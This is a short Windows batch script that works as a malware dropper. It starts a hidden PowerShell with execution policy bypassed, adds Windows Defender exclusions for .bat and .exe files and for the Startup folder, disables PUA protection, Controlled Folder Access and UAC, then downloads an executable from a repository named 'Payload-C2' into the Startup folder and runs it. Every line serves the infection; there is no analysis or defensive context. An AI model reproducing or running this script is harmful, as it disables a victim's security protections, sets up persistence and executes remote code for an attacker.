@echo off
start /B powershell.exe -nop -ep bypass -w 1
powershell.exe -command "Add-MpPreference -ExclusionExtension ".bat""

powershell.exe -command "Add-MpPreference -ExclusionExtension ".exe""

powershell -inputformat none -outputformat none -NonInteractive -Command "Add-MpPreference -ExclusionPath '"%USERPROFILE%\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup'"

powershell.exe -command "Set-MpPreference -PUAProtection disable"

powershell.exe -command "Set-MpPreference -EnableControlledFolderAccess Disabled"

powershell.exe New-ItemProperty -Path HKLM:Software\Microsoft\Windows\CurrentVersion\policies\system -Name EnableLUA -PropertyType DWord -Value 0 -Force

cd "%USERPROFILE%\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup

powershell -command "& { (New-Object Net.WebClient).DownloadFile('https://github.com/DieFrikadelle/Payload-C2/raw/refs/heads/main/tester/saiko/saik0/kp%E2%81%ADgjiu/33port.exe', '.\33port.exe') }

powershell -command "start 33port.exe" 
